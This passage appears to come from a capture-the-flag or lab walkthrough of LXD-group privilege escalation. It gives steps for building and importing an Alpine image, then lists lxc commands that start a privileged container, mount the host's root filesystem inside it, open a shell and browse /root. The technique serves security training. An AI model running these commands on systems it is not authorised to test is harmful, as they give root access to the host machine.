- Steps to be performed on the attacking machine:
- - Download build-alpine on your local machine via the [git repository](https://github.com/lxd-images/alpine-3-7-apache-php5-6)
-  - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.
- - Transfer this newly created tar file to the victim machine
- Steps to be performed on the victim machine:
- - Download the alpine image
- - Import image for lxd
- - Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step
- - Mount the container inside the /root directory

  

![](https://i.imgur.com/CpTIK5V.png)  

_Checking what images are available via the command: lxc image list_

4. Now for the fun bit. Next, we'll run a series of commands which initialize, configure the disks, and start the container. Image name needs to match up with the imported image we'll be using. In the case of the image above, that'd be the myimage alias previously assigned to it. The container name and device name are whatever your heart desires. In my example, I'm naming my container strongbad and the device trogdor.

  
```
lxc init IMAGENAME CONTAINERNAME -c security.privileged=true

lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true

lxc start CONTAINERNAME

lxc exec CONTAINERNAME /bin/sh

id

cd /mnt/root/root
```